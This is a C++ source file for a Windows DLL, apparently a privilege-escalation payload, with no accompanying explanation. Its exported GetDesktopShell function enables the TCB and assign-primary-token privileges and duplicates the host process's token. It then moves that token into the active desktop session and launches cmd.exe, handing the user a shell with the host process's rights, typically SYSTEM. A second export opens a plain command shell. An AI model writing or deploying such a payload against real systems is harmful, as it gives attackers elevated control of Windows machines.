#include "pch.h"

#define SE_ASSIGNPRIMARYTOKEN_PRIVILEGE 3
#define SE_TCB_PRIVILEGE 7

extern "C"
{
    __declspec(dllexport) BOOL GetDesktopShell()
    {
        HANDLE hCurrentToken = NULL;
        DWORD nDesktopSessionId = -1;
        PWTS_SESSION_INFOW pSessionInfo = nullptr;
        DWORD nCount = 0;
        DWORD requiredPrivs[] = {
            SE_ASSIGNPRIMARYTOKEN_PRIVILEGE,
            SE_TCB_PRIVILEGE
        };
        HANDLE hToken = NULL;
        HANDLE hDupToken = NULL;
        PROCESS_INFORMATION pi = { 0 };
        BOOL bSuccess = WTSEnumerateSessionsW(
            NULL,
            0,
            1,
            &pSessionInfo,
            &nCount);

        if (bSuccess)
        {
            for (DWORD idx = 0; idx < nCount; idx++)
            {
                if (pSessionInfo[idx].State == WTSActive)
                {
                    nDesktopSessionId = pSessionInfo[idx].SessionId;
                    break;
                }
            }

            ::WTSFreeMemory(pSessionInfo);
        }

        if (nDesktopSessionId == -1)
            return FALSE;

        ::OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES, &hCurrentToken);

        for (DWORD idx = 0; idx < (sizeof(requiredPrivs) / sizeof(DWORD)); idx++)
        {
            DWORD nReturnedLength = 0;
            auto tokenPrivileges = TOKEN_PRIVILEGES();
            tokenPrivileges.PrivilegeCount = 1;
            tokenPrivileges.Privileges[0].Luid = { requiredPrivs[idx], 0 };
            tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            bSuccess = ::AdjustTokenPrivileges(
                hCurrentToken,
                FALSE,
                &tokenPrivileges,
                sizeof(tokenPrivileges),
                nullptr,
                &nReturnedLength);
        }

        ::CloseHandle(hCurrentToken);
        bSuccess = ::OpenProcessToken((HANDLE)-1, TOKEN_DUPLICATE, &hToken);

        if (!bSuccess)
            return FALSE;

        bSuccess = ::DuplicateTokenEx(
            hToken,
            TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY,
            nullptr,
            SecurityAnonymous,
            TokenPrimary,
            &hDupToken);
        ::CloseHandle(hToken);

        if (!bSuccess)
            return FALSE;

        // Requires SeTcbPrivilege
        bSuccess = ::SetTokenInformation(
            hDupToken,
            TokenSessionId,
            &nDesktopSessionId,
            sizeof(nDesktopSessionId));

        if (bSuccess)
        {
            STARTUPINFO si = { 0 };
            si.cb = sizeof(si);
            si.wShowWindow = SW_SHOW;
            si.lpDesktop = const_cast<wchar_t*>(L"Winsta0\\Default");

            // Requires SeAssignPrimaryTokenPrivilege
            bSuccess = ::CreateProcessAsUser(
                hDupToken,
                const_cast<wchar_t*>(L"C:\\Windows\\System32\\cmd.exe"),
                const_cast<wchar_t*>(L""),
                nullptr,
                nullptr,
                FALSE,
                CREATE_BREAKAWAY_FROM_JOB | CREATE_NEW_CONSOLE,
                nullptr,
                nullptr,
                &si,
                &pi);
        }

        ::CloseHandle(hDupToken);

        if (bSuccess)
        {
            ::CloseHandle(pi.hThread);
            ::CloseHandle(pi.hProcess);
        }

        return bSuccess;
    }


    __declspec(dllexport) BOOL GetShell()
    {
        STARTUPINFO si = { 0 };
        PROCESS_INFORMATION pi = { 0 };
        si.cb = sizeof(si);
        si.wShowWindow = SW_SHOW;
        si.lpDesktop = const_cast<wchar_t*>(L"Winsta0\\Default");
        
        BOOL bSuccess = ::CreateProcess(
            const_cast<wchar_t*>(L"C:\\Windows\\System32\\cmd.exe"),
            const_cast<wchar_t*>(L""),
            nullptr,
            nullptr,
            FALSE,
            CREATE_NEW_CONSOLE,
            nullptr,
            nullptr,
            &si,
            &pi);

        if (bSuccess)
        {
            ::CloseHandle(pi.hThread);
            ::CloseHandle(pi.hProcess);
        }

        return bSuccess;
    }
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD  dwReason, LPVOID lpReserved)
{
    return TRUE;
}